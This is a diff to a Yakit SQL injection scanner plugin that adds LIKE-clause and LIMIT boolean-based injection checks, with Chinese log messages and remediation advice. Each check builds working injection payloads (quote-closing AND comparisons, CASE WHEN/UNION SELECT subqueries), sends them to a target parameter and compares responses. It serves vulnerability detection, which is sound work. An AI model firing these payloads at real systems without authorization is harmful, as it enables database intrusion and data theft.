@@ -6,7 +6,7 @@ LOWER_RATIO_BOUND = 0.02
 UPPER_RATIO_BOUND = 0.98
 DIFF_TOLERANCE = 0.05
 
-CLOSE_TYPE = {0: `'`, 1: `"`, 2: ``, 3: `')`, 4: `")`}
+CLOSE_TYPE = {0: `'`, 1: `"`, 2: ``, 3: `')`, 4: `")`,5:`%'`,6:`%"`,7:`%')`,8:`%")`}
 
 //const
 FORMAT_EXCEPTION_STRINGS = ["Type mismatch", "Error converting", "Please enter a", "Conversion failed", "String or binary data would be truncated", "Failed to convert", "unable to interpret text value", "Input string was not in a correct format", "System.FormatException", "java.lang.NumberFormatException", "ValueError: invalid literal", "TypeMismatchException", "CF_SQL_INTEGER", "CF_SQL_NUMERIC", " for CFSQLTYPE ", "cfqueryparam cfsqltype", "InvalidParamTypeException", "Invalid parameter type", "Attribute validation error for tag", "is not of type numeric", "<cfif Not IsNumeric(", "invalid input syntax for integer", "invalid input syntax for type", "invalid number", "character to number conversion error", "unable to interpret text value", "String was not recognized as a valid", "Convert.ToInt", "cannot be converted to a ", "InvalidDataException", "Arguments are of the wrong type"]
@@ -1064,6 +1064,10 @@ case 2:
             if res {
                 return 2
             }
+            res = checkLimitNoBound(param, originValue, originResponse, isNumeric)
+            if res {
+                return 2
+            }
 
 case 3:
             res = checkType3(param, originValue, originResponse, isNumeric)
@@ -1077,6 +1081,30 @@ case 4:
                 return 4
             }
 
+case 5:
+            res = checkType5(param, originValue, originResponse, isNumeric)
+            if res {
+                return 5
+            }
+
+case 6:
+            res = checkType6(param, originValue, originResponse, isNumeric)
+            if res {
+                return 6
+            }
+
+case 7:
+            res = checkType7(param, originValue, originResponse, isNumeric)
+            if res {
+                return 7
+            }
+
+case 8:
+            res = checkType8(param, originValue, originResponse, isNumeric)
+            if res {
+                return 8
+            }
+
 }
 
     }
@@ -1084,13 +1112,12 @@ case 4:
 
     res = checkTypeOrderBy(param, originValue, originResponse, isNumeric)
     if res {
-        die("检测到ORDER BY")//nothing else to do
+        die("检测到ORDER BY")//nothing else to do        //nothing else to do
     }
 
 
     return -1
 }
-
 /* 测试 ' 闭合类型 */
 func checkType0(param, originValue, originResponse, IsNumeric) {
     var positivePayload, negativePayload, paramType
@@ -1686,6 +1713,482 @@ func checkType4(param, originValue, originResponse, IsNumeric) {
     return true
 }
 
+/* 测试 %' like场景 */
+func checkType5(param, originValue, originResponse, IsNumeric){
+    var positivePayload, negativePayload, paramType
+    defer func {
+        err := recover()
+        if err != nil {
+            yakit_output(err)
+        }
+
+    }
+
+
+    if IsNumeric {
+        paramType = "数字"
+        rand1 := randn(1, 20000)
+        positivePayload = sprintf(`%v%%'/**/AND/**/'%v'='%v'AND'%v%%'='%v`, originValue, rand1, rand1, originValue, originValue)
+        negativePayload = sprintf(`%v%%'/**/AND/**/'%v'='%v'AND'%v%%'='%v`, originValue, rand1, rand1 + 1, originValue, originValue)
+    } else {
+        paramType = "字符串"
+        randString := randstr(4)
+        positivePayload = sprintf(`%v%%'/**/AND/**/'%v'='%v'AND'%v%%'='%v`, originValue, randString, randString, originValue, originValue)
+        negativePayload = sprintf(`%v%%'/**/AND/**/'%v'='%v'AND'%v%%'='%v`, originValue, randString, randstr(5), originValue, originValue)
+    }
+
+
+    res = originResponse
+    _, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)
+
+    p1rsp, err := param.Fuzz(positivePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
+    if err != nil {
+        yakit_output(sprintf(("request positive rsp error: %s"), err))
+        return false
+    }
+
+
+    _, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)
+
+    n1rsp, err := param.Fuzz(negativePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
+    if err != nil {
+        yakit_output(sprintf("response negative rsp error: %v", err))
+        return false
+    }
+
+
+    _, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)
+
+    if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
+        yakit_output("response empty")
+        return false
+    }
+
+
+
+    opResult := str.CalcSimilarity(bodyOrigin, pBody)
+
+    if opResult < UPPER_RATIO_BOUND {
+        REASON = sprintf(
+            `参数为%v，假定like单引号边界，[%v]与原参数结果不相同`,
+            paramType,
+            positivePayload,
+        )
+        yakit_output(REASON)
+        return false
+    }
+
+
+    pnResult := str.CalcSimilarity(pBody, nBody)
+
+    if pnResult > SIMILARITY_RATIO {
+        reason = sprintf(
+            "参数为%v，注入检查失败：原因：[%v] 与 [%v] 结果类似/相同: 相似度为：%v",
+            paramType,
+            positivePayload,
+            negativePayload,
+            pnResult,
+        )
+        yakit_output(reason)
+        return false
+    }
+
+
+    yakit_output(sprintf(
+        "疑似SQL注入：【参数：%v型[%v] like注入( '% ))】",
+        paramType,
+        param.Name(),
+    ))
+    yakit_output(sprintf(
+        "测试使用的positive payload为: %v 响应包为: %s",
+        positivePayload,
+        string(pBody),
+    ))
+    yakit_output(sprintf(
+        "测试使用的negative payload为: %v 响应包为: %s",
+        negativePayload,
+        string(nBody),
+    ))
+
+    risk.NewRisk(
+        res.Url,
+        risk.title(sprintf(
+            "Maybe SQL Injection: [param - type:str value:%v single-quote like]",
+            originValue,
+        )),
+        risk.titleVerbose(sprintf(
+            "疑似SQL注入：【参数：%v[%v] like注入( %%' )】",
+            paramType,
+            param.Name(),
+        )),
+        risk.description("SQL 注入是一种常见的安全漏洞，指的是攻击者通过在应用程序的输入字段中插入恶意的 SQL 代码，从而绕过应用程序的验证和过滤机制，对数据库执行未经授权的操作或获取敏感数据。这类漏洞可能导致数据泄露、数据损坏、越权访问、拒绝服务和完全系统崩溃等严重后果"),
+        risk.solution("使用参数化查询,使用 ORM（对象关系映射）框架,进行输入验证和过滤,代码遵循最小权限原则"),
+        risk.type("sqlinjection"),
+        risk.payload(negativePayload),
+        risk.parameter(param.Name()),
+        risk.request(n1rsp.RequestRaw),
+        risk.response(n1rsp.ResponseRaw),
+    )
+    return true
+}
+
+/* 测试 %" like场景 */
+func checkType6(param, originValue, originResponse, IsNumeric){
+    var positivePayload, negativePayload, paramType
+    defer func {
+        err := recover()
+        if err != nil {
+            yakit_output(err)
+        }
+
+    }
+
+
+    if IsNumeric {
+        paramType = "数字"
+        rand1 := randn(1, 20000)
+        positivePayload = sprintf(`%v%%'/**/AND/**/'%v'='%v'AND'%v%%'="%v`, originValue, rand1, rand1, originValue, originValue)
+        negativePayload = sprintf(`%v%%'/**/AND/**/'%v'='%v'AND'%v%%'="%v`, originValue, rand1, rand1 + 1, originValue, originValue)
+    } else {
+        paramType = "字符串"
+        randString := randstr(4)
+        positivePayload = sprintf(`%v%%'/**/AND/**/'%v'='%v'AND'%v%%'="%v`, originValue, randString, randString, originValue, originValue)
+        negativePayload = sprintf(`%v%%'/**/AND/**/'%v'='%v'AND'%v%%'="%v`, originValue, randString, randstr(5), originValue, originValue)
+    }
+
+
+    res = originResponse
+    _, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)
+
+    p1rsp, err := param.Fuzz(positivePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
+    if err != nil {
+        yakit_output(sprintf(("request positive rsp error: %s"), err))
+        return false
+    }
+
+
+    _, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)
+
+    n1rsp, err := param.Fuzz(negativePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
+    if err != nil {
+        yakit_output(sprintf("response negative rsp error: %v", err))
+        return false
+    }
+
+
+    _, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)
+
+    if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
+        yakit_output("response empty")
+        return false
+    }
+
+
+
+    opResult := str.CalcSimilarity(bodyOrigin, pBody)
+
+    if opResult < UPPER_RATIO_BOUND {
+        REASON = sprintf(
+            `参数为%v，假定like单引号边界，[%v]与原参数结果不相同`,
+            paramType,
+            positivePayload,
+        )
+        yakit_output(REASON)
+        return false
+    }
+
+
+    pnResult := str.CalcSimilarity(pBody, nBody)
+
+    if pnResult > SIMILARITY_RATIO {
+        reason = sprintf(
+            "参数为%v，注入检查失败：原因：[%v] 与 [%v] 结果类似/相同: 相似度为：%v",
+            paramType,
+            positivePayload,
+            negativePayload,
+            pnResult,
+        )
+        yakit_output(reason)
+        return false
+    }
+
+
+    yakit_output(sprintf(
+        "疑似SQL注入：【参数：%v型[%v] like注入( \"% ))】",
+        paramType,
+        param.Name(),
+    ))
+    yakit_output(sprintf(
+        "测试使用的positive payload为: %v 响应包为: %s",
+        positivePayload,
+        string(pBody),
+    ))
+    yakit_output(sprintf(
+        "测试使用的negative payload为: %v 响应包为: %s",
+        negativePayload,
+        string(nBody),
+    ))
+
+    risk.NewRisk(
+        res.Url,
+        risk.title(sprintf(
+            "Maybe SQL Injection: [param - type:str value: %v double-quote like]",
+            originValue,
+        )),
+        risk.titleVerbose(sprintf(
+            "疑似SQL注入：【参数：%v[%v] like注入( %%\" )】",
+            paramType,
+            param.Name(),
+        )),
+        risk.description("SQL 注入是一种常见的安全漏洞，指的是攻击者通过在应用程序的输入字段中插入恶意的 SQL 代码，从而绕过应用程序的验证和过滤机制，对数据库执行未经授权的操作或获取敏感数据。这类漏洞可能导致数据泄露、数据损坏、越权访问、拒绝服务和完全系统崩溃等严重后果"),
+        risk.solution("使用参数化查询,使用 ORM（对象关系映射）框架,进行输入验证和过滤,代码遵循最小权限原则"),
+        risk.type("sqlinjection"),
+        risk.payload(negativePayload),
+        risk.parameter(param.Name()),
+        risk.request(n1rsp.RequestRaw),
+        risk.response(n1rsp.ResponseRaw),
+    )
+    return true
+}
+
+/* 测试 %') like场景 */
+func checkType7(param, originValue, originResponse, IsNumeric){
+    var positivePayload, negativePayload, paramType
+    defer func {
+        err := recover()
+        if err != nil {
+            yakit_output(err)
+        }
+
+    }
+
+
+    if IsNumeric {
+        paramType = "数字"
+        rand1 := randn(1, 20000)
+        positivePayload = sprintf(`%v%%')/**/AND/**/'%v'='%v'AND'%v%%'=('%v`, originValue, rand1, rand1, originValue, originValue)
+        negativePayload = sprintf(`%v%%')/**/AND/**/'%v'='%v'AND'%v%%'=('%v`, originValue, rand1, rand1 + 1, originValue, originValue)
+    } else {
+        paramType = "字符串"
+        randString := randstr(4)
+        positivePayload = sprintf(`%v%%')/**/AND/**/'%v'='%v'AND'%v%%'=('%v`, originValue, randString, randString, originValue, originValue)
+        negativePayload = sprintf(`%v%%')/**/AND/**/'%v'='%v'AND'%v%%'=('%v`, originValue, randString, randstr(5), originValue, originValue)
+    }
+
+
+    res = originResponse
+    _, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)
+
+    p1rsp, err := param.Fuzz(positivePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
+    if err != nil {
+        yakit_output(sprintf(("request positive rsp error: %s"), err))
+        return false
+    }
+
+
+    _, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)
+
+    n1rsp, err := param.Fuzz(negativePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
+    if err != nil {
+        yakit_output(sprintf("response negative rsp error: %v", err))
+        return false
+    }
+
+
+    _, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)
+
+    if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
+        yakit_output("response empty")
+        return false
+    }
+
+
+
+    opResult := str.CalcSimilarity(bodyOrigin, pBody)
+
+    if opResult < UPPER_RATIO_BOUND {
+        REASON = sprintf(
+            `参数为%v，假定like单引号边界，[%v]与原参数结果不相同`,
+            paramType,
+            positivePayload,
+        )
+        yakit_output(REASON)
+        return false
+    }
+
+
+    pnResult := str.CalcSimilarity(pBody, nBody)
+
+    if pnResult > SIMILARITY_RATIO {
+        reason = sprintf(
+            "参数为%v，注入检查失败：原因：[%v] 与 [%v] 结果类似/相同: 相似度为：%v",
+            paramType,
+            positivePayload,
+            negativePayload,
+            pnResult,
+        )
+        yakit_output(reason)
+        return false
+    }
+
+
+    yakit_output(sprintf(
+        "疑似SQL注入：【参数：%v型[%v] like注入( %%') ))】",
+        paramType,
+        param.Name(),
+    ))
+    yakit_output(sprintf(
+        "测试使用的positive payload为: %v 响应包为: %s",
+        positivePayload,
+        string(pBody),
+    ))
+    yakit_output(sprintf(
+        "测试使用的negative payload为: %v 响应包为: %s",
+        negativePayload,
+        string(nBody),
+    ))
+
+    risk.NewRisk(
+        res.Url,
+        risk.title(sprintf(
+            "Maybe SQL Injection: [param - value: %v single-quote paren like]",
+            originValue,
+        )),
+        risk.titleVerbose(sprintf(
+            "疑似SQL注入：【参数：%v[%v] like注入( %%') )】",
+            paramType,
+            param.Name(),
+        )),
+        risk.description("SQL 注入是一种常见的安全漏洞，指的是攻击者通过在应用程序的输入字段中插入恶意的 SQL 代码，从而绕过应用程序的验证和过滤机制，对数据库执行未经授权的操作或获取敏感数据。这类漏洞可能导致数据泄露、数据损坏、越权访问、拒绝服务和完全系统崩溃等严重后果"),
+        risk.solution("使用参数化查询,使用 ORM（对象关系映射）框架,进行输入验证和过滤,代码遵循最小权限原则"),
+        risk.type("sqlinjection"),
+        risk.payload(negativePayload),
+        risk.parameter(param.Name()),
+        risk.request(n1rsp.RequestRaw),
+        risk.response(n1rsp.ResponseRaw),
+    )
+    return true
+}
+
+/* 测试 %") like场景 */
+func checkType8(param, originValue, originResponse, IsNumeric){
+    var positivePayload, negativePayload, paramType
+    defer func {
+        err := recover()
+        if err != nil {
+            yakit_output(err)
+        }
+
+    }
+
+
+    if IsNumeric {
+        paramType = "数字"
+        rand1 := randn(1, 20000)
+        positivePayload = sprintf(`%v%%")/**/AND/**/'%v'='%v'AND'%v%%'=("%v`, originValue, rand1, rand1, originValue, originValue)
+        negativePayload = sprintf(`%v%%")/**/AND/**/'%v'='%v'AND'%v%%'=("%v`, originValue, rand1, rand1 + 1, originValue, originValue)
+    } else {
+        paramType = "字符串"
+        randString := randstr(4)
+        positivePayload = sprintf(`%v%%")/**/AND/**/'%v'='%v'AND'%v%%'=("%v`, originValue, randString, randString, originValue, originValue)
+        negativePayload = sprintf(`%v%%")/**/AND/**/'%v'='%v'AND'%v%%'=("%v`, originValue, randString, randstr(5), originValue, originValue)
+    }
+
+
+    res = originResponse
+    _, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)
+
+    p1rsp, err := param.Fuzz(positivePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
+    if err != nil {
+        yakit_output(sprintf(("request positive rsp error: %s"), err))
+        return false
+    }
+
+
+    _, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)
+
+    n1rsp, err := param.Fuzz(negativePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
+    if err != nil {
+        yakit_output(sprintf("response negative rsp error: %v", err))
+        return false
+    }
+
+
+    _, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)
+
+    if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
+        yakit_output("response empty")
+        return false
+    }
+
+
+
+    opResult := str.CalcSimilarity(bodyOrigin, pBody)
+
+    if opResult < UPPER_RATIO_BOUND {
+        REASON = sprintf(
+            `参数为%v，假定like双引号括号边界，[%v]与原参数结果不相同`,
+            paramType,
+            positivePayload,
+        )
+        yakit_output(REASON)
+        return false
+    }
+
+
+    pnResult := str.CalcSimilarity(pBody, nBody)
+
+    if pnResult > SIMILARITY_RATIO {
+        reason = sprintf(
+            "参数为%v，注入检查失败：原因：[%v] 与 [%v] 结果类似/相同: 相似度为：%v",
+            paramType,
+            positivePayload,
+            negativePayload,
+            pnResult,
+        )
+        yakit_output(reason)
+        return false
+    }
+
+
+    yakit_output(sprintf(
+        "疑似SQL注入：【参数：%v型[%v] like注入( \"% ))】",
+        paramType,
+        param.Name(),
+    ))
+    yakit_output(sprintf(
+        "测试使用的positive payload为: %v 响应包为: %s",
+        positivePayload,
+        string(pBody),
+    ))
+    yakit_output(sprintf(
+        "测试使用的negative payload为: %v 响应包为: %s",
+        negativePayload,
+        string(nBody),
+    ))
+
+    risk.NewRisk(
+        res.Url,
+        risk.title(sprintf(
+            "Maybe SQL Injection: [param - type: value:%v double-quote paren like]",
+            originValue,
+        )),
+        risk.titleVerbose(sprintf(
+            "疑似SQL注入：【参数：%v[%v] like注入( %%\") )】",
+            paramType,
+            param.Name(),
+        )),
+        risk.description("SQL 注入是一种常见的安全漏洞，指的是攻击者通过在应用程序的输入字段中插入恶意的 SQL 代码，从而绕过应用程序的验证和过滤机制，对数据库执行未经授权的操作或获取敏感数据。这类漏洞可能导致数据泄露、数据损坏、越权访问、拒绝服务和完全系统崩溃等严重后果"),
+        risk.solution("使用参数化查询,使用 ORM（对象关系映射）框架,进行输入验证和过滤,代码遵循最小权限原则"),
+        risk.type("sqlinjection"),
+        risk.payload(negativePayload),
+        risk.parameter(param.Name()),
+        risk.request(n1rsp.RequestRaw),
+        risk.response(n1rsp.ResponseRaw),
+    )
+    return true
+}
+
 /* 测试order by无闭合类型 */
 func checkTypeOrderBy(param, originValue, originResponse, IsNumeric) {
     var positivePayload, negativePayload, paramType
@@ -1832,6 +2335,120 @@ func checkTypeOrderBy(param, originValue, originResponse, IsNumeric) {
 
     return true//尽管没检测出直接延时，但还是检测到页面变化，可能是ORDER BY注入 需要人工判断
     //尽管没检测出直接延时，但还是检测到页面变化，可能是ORDER BY注入 需要人工判断
+}
+
+// 测试limit 无闭合类型
+func checkLimitNoBound(param, originValue, originResponse, IsNumeric) {
+    var positivePayload, negativePayload, paramType
+    defer func {
+        err := recover()
+        if err != nil {
+            yakit_output(err)
+        }
+
+    }
+    if IsNumeric {
+        paramType = "数字"
+        rand1 := randn(1, 20000)
+        positivePayload = sprintf(`(SELECT/**/(CASE/**/WHEN/**/(%v=%v)/**/THEN/**/%v/**/ELSE/**/(SELECT/**/%v/**/UNION/**/SELECT/**/%v)/**/END))`, rand1, rand1, originValue, rand1, rand1+100)
+        negativePayload = sprintf(`(SELECT/**/(CASE/**/WHEN/**/(%v=%v)/**/THEN/**/%v/**/ELSE/**/(SELECT/**/%v/**/UNION/**/SELECT/**/%v)/**/END))`, rand1, rand1+1, originValue, rand1, rand1+100)
+    } else {
+       return false
+    }
+
+
+    res = originResponse
+    _, bodyOrigin = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)
+
+    p1rsp, err := param.Fuzz(positivePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
+    if err != nil {
+        yakit_output(sprintf(("request positive rsp error: %s"), err))
+        return false
+    }
+
+
+    _, pBody = str.SplitHTTPHeadersAndBodyFromPacket(p1rsp.ResponseRaw)
+
+    n1rsp, err := param.Fuzz(negativePayload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
+    if err != nil {
+        yakit_output(sprintf("response negative rsp error: %v", err))
+        return false
+    }
+
+
+    _, nBody = str.SplitHTTPHeadersAndBodyFromPacket(n1rsp.ResponseRaw)
+
+    if res.ResponseRaw == nil || p1rsp.ResponseRaw == nil {
+        yakit_output("response empty")
+        return false
+    }
+
+
+
+    opResult := str.CalcSimilarity(bodyOrigin, pBody)
+
+    if opResult < UPPER_RATIO_BOUND {
+        REASON = sprintf(
+            `参数为%v，假定like单引号边界，[%v]与原参数结果不相同`,
+            paramType,
+            positivePayload,
+        )
+        yakit_output(REASON)
+        return false
+    }
+
+
+    pnResult := str.CalcSimilarity(pBody, nBody)
+
+    if pnResult > SIMILARITY_RATIO {
+        reason = sprintf(
+            "参数为%v，注入检查失败：原因：[%v] 与 [%v] 结果类似/相同: 相似度为：%v",
+            paramType,
+            positivePayload,
+            negativePayload,
+            pnResult,
+        )
+        yakit_output(reason)
+        return false
+    }
+
+
+    yakit_output(sprintf(
+        "疑似SQL注入：【参数：%v型[%v] like注入( \"% ))】",
+        paramType,
+        param.Name(),
+    ))
+    yakit_output(sprintf(
+        "测试使用的positive payload为: %v 响应包为: %s",
+        positivePayload,
+        string(pBody),
+    ))
+    yakit_output(sprintf(
+        "测试使用的negative payload为: %v 响应包为: %s",
+        negativePayload,
+        string(nBody),
+    ))
+
+    risk.NewRisk(
+        res.Url,
+        risk.title(sprintf(
+            "Maybe SQL Injection: [param - type:limit value:%v no bound]",
+            originValue,
+        )),
+        risk.titleVerbose(sprintf(
+            "疑似SQL注入：【参数：%v[%v] limit 无边界闭合】",
+            paramType,
+            param.Name(),
+        )),
+        risk.description("SQL 注入是一种常见的安全漏洞，指的是攻击者通过在应用程序的输入字段中插入恶意的 SQL 代码，从而绕过应用程序的验证和过滤机制，对数据库执行未经授权的操作或获取敏感数据。这类漏洞可能导致数据泄露、数据损坏、越权访问、拒绝服务和完全系统崩溃等严重后果"),
+        risk.solution("使用参数化查询,使用 ORM（对象关系映射）框架,进行输入验证和过滤,代码遵循最小权限原则"),
+        risk.type("sqlinjection"),
+        risk.payload(negativePayload),
+        risk.parameter(param.Name()),
+        risk.request(n1rsp.RequestRaw),
+        risk.response(n1rsp.ResponseRaw),
+    )
+    return true
 }
 
 __test__ = func() {
